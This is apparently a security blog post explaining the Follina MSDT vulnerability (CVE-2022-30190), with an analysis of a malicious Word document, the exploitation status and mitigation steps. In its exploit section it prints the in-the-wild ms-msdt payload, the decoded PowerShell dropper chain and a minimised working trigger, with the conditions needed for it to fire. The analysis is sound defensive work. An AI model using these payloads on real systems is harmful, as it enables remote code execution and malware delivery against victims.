---
title: "Explanation of CVE-2022-30190"
date: 2022-06-12T19:22:53+03:00
draft: false
---


### Executive Summary

A remote code execution vulnerability exists when Microsoft Windows Support Diagnostic Tool is called using the URL protocol from a calling application such as Word. An attacker who successfully exploits this vulnerability can run arbitrary code with the privileges of the calling application. The attacker can then do whatever they wants within the scope of the user’s rights.

### Introduction

This post is written about the remote code execution vulnerability named Follina or CVE-2022-30190 that found in Microsoft Windows Support Diagnostic Tool. This vulnerability features remote code execution, which means that once this code is detonated, threat actors can elevate their own privileges and potentially gain “god mode” access to the affected environment.

This security vulnerability is released at May 30, 2022. The mitigations that are available are messy workarounds. Remediation level of the security update that released by Microsoft is ‘Temporary Fix’.

The CVSS (Common Vulnerability Scoring System) 3.x Severity of the vulnerability is 7.8 HIGH.

### Explanation of The Vulnerability With Its Impact

Microsoft has confirmed the vulnerability affects an overwhelming majority of Windows and Windows Server versions, and advised  on a workaround to be implemented until a patch is ready.

Follina is a remote code execution (RCE) vulnerability in the Microsoft Support Diagnostic Tool; this can be exploited by getting an application, such as Word, to call out to the tool from a specially crafted document when opened.

### Explanation of The Exploit

Unzipping the file extracts all the components that make up the Office document.

![Untitled](/img/Microsoft%20Windows%20Support%20Diagnostic%20Tool%20(MSDT)%20R%20f4f28a9b81884cbfb6d6ab5b2a74ad8f/Untitled.png)

Inside the word/_rels/ is a document.xml.rels file, containing an external reference to hxxps[:]//www.xmlformats.com/office/word/2022/wordprocessingDrawing/RDF842l.html!

![Untitled](/img/Microsoft%20Windows%20Support%20Diagnostic%20Tool%20(MSDT)%20R%20f4f28a9b81884cbfb6d6ab5b2a74ad8f/Untitled%201.png)

This was the original contents of **RDF842l.html:**

![Untitled](/img/Microsoft%20Windows%20Support%20Diagnostic%20Tool%20(MSDT)%20R%20f4f28a9b81884cbfb6d6ab5b2a74ad8f/Untitled%202.png)

This HTML document begins with a script tag and includes a significant amount of commented A characters, which (considering they are just comments), would seem to serve no purpose… but from our testing, a hefty amount of characters is necessary ****for the exploit to fire.

At the very bottom of the script tag is the syntax:

`window.location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=cal?c IT_LaunchMethod=ContextMenu 
IT_SelectProgram=NotListed IT_BrowseForFile=h$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'JGNtZCA9ICJjOlx3aW5kb3dzXHN5c3RlbTMyXGNtZC5leGUiO1N0YXJ0LVByb2Nlc3MgJGNtZCAtd2luZG93c3R5bGUgaGlkZGVuI
C1Bcmd1bWVudExpc3QgIi9jIHRhc2traWxsIC9mIC9pbSBtc2R0LmV4ZSI7U3RhcnQtUHJvY2V
zcyAkY21kIC13aW5kb3dzdHlsZSBoaWRkZW4gLUFyZ3VtZW50TGlzdCAiL2MgY2QgQzpcdXNlcnNccHVibGljXCYmZm9y
IC9yICV0ZW1wJSAlaSBpbiAoMDUtMjAyMi0wNDM4LnJhcikgZG8gY29weSAlaSAxLnJhciAveSYmZmluZHN0
ciBUVk5EUmdBQUFBIDEucmFyPjEudCYmY2VydHV0aWwgLWRlY29kZSAxLnQgMS5jICYmZXhwYW5kIDEuYyAtRjoqIC4mJnJnYi5leGUiOw=='+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe
 IT_AutoTroubleshoot=ts_AUTO\"";`

This looks to be the crux of the exploit. Using a schema for ms-msdt, the native package PCWDiagnostic is invoked with the parameters IT_BrowseForFile which includes PowerShell syntax embedded within $().

The Base64 encoded data, ran through two layers of Invoke-Expression, decode to:

```
$cmd = "c:\windows\system32\cmd.exe";
Start-Process $cmd -windowstyle hidden -ArgumentList "/c taskkill /f /im msdt.exe";
Start-Process
 $cmd -windowstyle hidden -ArgumentList "/c cd
C:\users\public\&&for /r %temp% %i in (05-2022-0438.rar) do copy
 %i 1.rar /y&&findstr TVNDRgAAAA 1.rar>1.t&&certutil
-decode 1.t 1.c &&expand 1.c -F:* .&&rgb.exe";
```

With the path to **cmd.exe** captured as a variable, this process:

- Starts hidden windows to:
    - Kill msdt.exe if it is running
    - Loop through files inside a RAR file, looking for a Base64 string for an encoded CAB file
        - Store this Base64 encoded CAB file as **1.t**
        - Decode the Base64 encoded CAB file to be saved as **1.c**
        - Expand the **1.c** CAB file into the current directory, and finally:
        - Execute **rgb.exe** (presumably compressed inside the 1.c CAB file)

The impact of **rgb.exe** specifically is unknown, but the important takeaway is that this is a novel initial access technique that readily offers threat actors code execution with just a single click—or less. This is an enticing attack for adversaries as it is tucked inside of a Microsoft Word document without macros to trigger familiar warning signs to users—but with the ability to run remotely hosted code.

After some testing, it was clear that the payload would not execute without a significant number of padding characters (the A’s that were present in the HTML comments). Different variations are explored, using different characters and placing the block of comments above and below the triggering script code… but it wasn’t clear why this was necessary until the community stepped in. Rich Warren shareda blog from Bill Demirkapi indicating there was a hardcoded buffer size for an HTML processing function, and we were able to confirm any files with fewer than 4096 bytes would not invoke the payload.

Following even more tinkering, noticed that some syntax used within the script invocation was not necessary to invoke the payload. Using the same benign payload (with the opening of the Windows built-in calculator as our demonstration of success,) we could shrink the trigger to just:

location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(calc)/.exe\"";

It appeared that:

- At a minimum, two /../ directory traversals were required at the start of the IT_BrowseForFile parameter
- Code wrapped within $() would execute via PowerShell, but spaces would break it
- “.exe” must be the last trailing string present at the end of the IT_BrowseForFile parameter

While this is not by any means the most it could be compressed down to, we hope this shows how variants of this attack could exist.

![Untitled](/img/Microsoft%20Windows%20Support%20Diagnostic%20Tool%20(MSDT)%20R%20f4f28a9b81884cbfb6d6ab5b2a74ad8f/Untitled%203.png)

Additionally, the triggering payload can reach out to remote locations. While this is unlikely to invoke an untrusted binary, the connection will still carry NTLM hashes (which means that the bad actors now have a hash of the victim’s Windows password) that could be used by an adversary for further post-exploitation.

Bear in mind that this attack technique runs code under the user account that opened or navigated towards the malicious document. This means that an adversary may begin as a low privilege user (without admin permissions) but can then use this access to trigger further attacks to escalate privilege and gain more access into the target environment.

### Current exploitation status

Miscreants are reportedly exploiting the recently disclosed critical Windows Follina zero-day flaw to infect PCs with Qbot, thus aggressively expanding their reach.

The bot's operators are also working with the Black Basta gang to spread ransomware in yet another partnership in the underground world of cyber-crime, it is claimed.

This combination of Follina and its use to extort organizations makes the malware an even larger threat for enterprises.

According to Proofpoint, a crew identified as TA570 exploits the vulnerability in phishing campaigns by hijacking an email thread – a known tactic used by those distributing Qbot – and getting victims to open an HTML attachment that saves a .zip file. This archive contains a disk image file that contains a DLL, a Word document, and a .LNK shortcut file.

According to the Microsoft:

“The word **Remote** in the title refers to the location of the attacker. This type of exploit is sometimes referred to as Arbitrary Code Execution (ACE). The attack itself is carried out locally. For example, when the score indicates that the **Attack Vector** is **Local** and **User Interaction** is **Required**, this could describe an exploit in which an attacker, through social engineering, convinces a victim to download and open a specially crafted file from a website which leads to a local attack on their computer.”

### Mitigation Suggestions

- According the Microsoft’s advice, defenders can disable MSDT URL protocol until patches are released.
- ACROS Security has released micropatches for various editions of Windows and Windows Server, to be used via their 0patch agent.
- If utilizing Microsoft Defender’s Attack Surface Reduction  rules in your environment, activating the rule “Block all Office applications from creating child processes
” in Block mode prevent this from being exploited. However, if you’re not yet using ASR you may wish to run the rule in Audit mode and monitor the outcome to ensure there’s no adverse impact on end users.
- Remove the file type association for ms-msdt (can be done in Windows Registry HKCR:\ms-msdt or with Kelvin Tegelaar’s PowerShell snippet). When the malicious document is opened, Office will not be able to invoke ms-msdt thus preventing the malware from running. Be sure to make a backup of the registry settings before using this mitigation.
- Educating users to identify and delete malicious emails remains your best line of defense until a patch is available to deploy to your endpoints.

### Conclusion

The seriousness and efficiency of the collaboration cannot be underestimated. Enterprises must implement new concepts like zero trust and implement stringent identity governance to know what permissions they have granted to all accounts and to watch for any changes.

### Resources

[https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2022-30190](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2022-30190)

https://nvd.nist.gov/vuln/detail/CVE-2022-30190

https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-30190

https://www.helpnetsecurity.com/2022/06/03/patch-cve-2022-30190/